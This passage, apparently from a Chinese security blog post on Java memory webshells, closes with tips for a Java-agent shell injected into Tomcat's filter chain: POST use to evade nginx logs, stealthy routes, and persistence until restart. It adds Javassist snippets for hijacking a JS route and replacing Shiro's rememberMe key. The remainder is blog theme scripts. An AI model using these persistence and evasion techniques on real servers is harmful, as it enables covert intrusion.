+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260408212311825.png" alt="image-20260408212311825"></p>
+<p>注意事项：</p>
+<ol>
+<li><p>由于某些中间件（例如nginx）只记录GET请求，使用POST方式发送数据会更加隐蔽。</p>
+</li>
+<li><p>由于在Filter层过滤了http请求，访问任意的路由都可以执行恶意代码，为了隐蔽性不建议使用不存在的路由。</p>
+</li>
+<li><p>agent可以注入多个，但是相同类名的 <code>transformer</code> 只能注入一个，所以要再次注入别的 agent 的时候记得更改一下类名。</p>
+</li>
+<li><p>这种内存马一旦注入到目标程序中，除了重启没有办法直接卸载掉，因为修改掉了原本的类的字节码。它的逻辑只是调用了<code>internalDoFilter()</code>方法（简单来说）。还原就只需要<code>setBody()</code>即可：、</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">final</span> javax.servlet.<span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> $<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">final</span> javax.servlet.<span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> $<span class="number">2</span>;</span><br><span class="line">    $<span class="number">0.</span>internalDoFilter(req,res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="java-agent后续其他利用"><a href="#java-agent后续其他利用" class="headerlink" title="java agent后续其他利用"></a>java agent后续其他利用</h3><h4 id="路由劫持"><a href="#路由劫持" class="headerlink" title="路由劫持"></a>路由劫持</h4><p>如果在A的 <code>/login</code> 中使用了 <code>/static/js/1.js</code>，那就可以劫持这个路由，回显给他恶意的js代码。</p>
+<h4 id="替换shiro的key"><a href="#替换shiro的key" class="headerlink" title="替换shiro的key"></a>替换shiro的key</h4><p>shiro 在解析 rememberMe 的时候，先将其 base64 解码，然后使用 AES 解密，在 AES 解密的时候，会调用<code>org.apache.shiro.mgt.AbstractRememberMeManager#getDecryptionCipherKey()</code>，<code>getDecryptionCipherKey</code> 是一个 getter 方法，它没有复杂的逻辑，通常只是返回一个成员变量，所以直接修改返回值为我们想要的密钥就行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">editClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">editClassName2</span> <span class="operator">=</span> editClassName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">editMethod</span> <span class="operator">=</span> <span class="string">&quot;doFilter&quot;</span>;</span><br><span class="line">.....</span><br><span class="line"><span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;&#123; return java.util.Base64.getDecoder().decode(\&quot;kPH+bIxk5D2deZiIxcaaaA==\&quot;); &#125;&quot;</span>;</span><br><span class="line">method.setBody(source);</span><br></pre></td></tr></table></figure>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2026/04/22/FastJson/">FastJson</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2026/04/04/ClassLoader/">ClassLoader</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Zimo</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Java内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat-Servlet"><span class="toc-text">Tomcat &amp; Servlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2"><span class="toc-text">内存马初探</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filter"><span class="toc-text">filter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-text">内存马编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener"><span class="toc-text">Listener</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90-1"><span class="toc-text">流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99-1"><span class="toc-text">内存马编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-agent-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Java agent &amp; 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-agent-%E7%AE%80%E4%BB%8B"><span class="toc-text">Java agent 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E8%B0%88-Instrumentation"><span class="toc-text">浅谈 Instrumentation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E8%B0%88-ClassFileTransformer"><span class="toc-text">浅谈 ClassFileTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Java-agent-%E5%86%99-SpringBoot-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">利用 Java agent 写 SpringBoot 内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-agent%E5%90%8E%E7%BB%AD%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8"><span class="toc-text">java agent后续其他利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%8A%AB%E6%8C%81"><span class="toc-text">路由劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2shiro%E7%9A%84key"><span class="toc-text">替换shiro的key</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
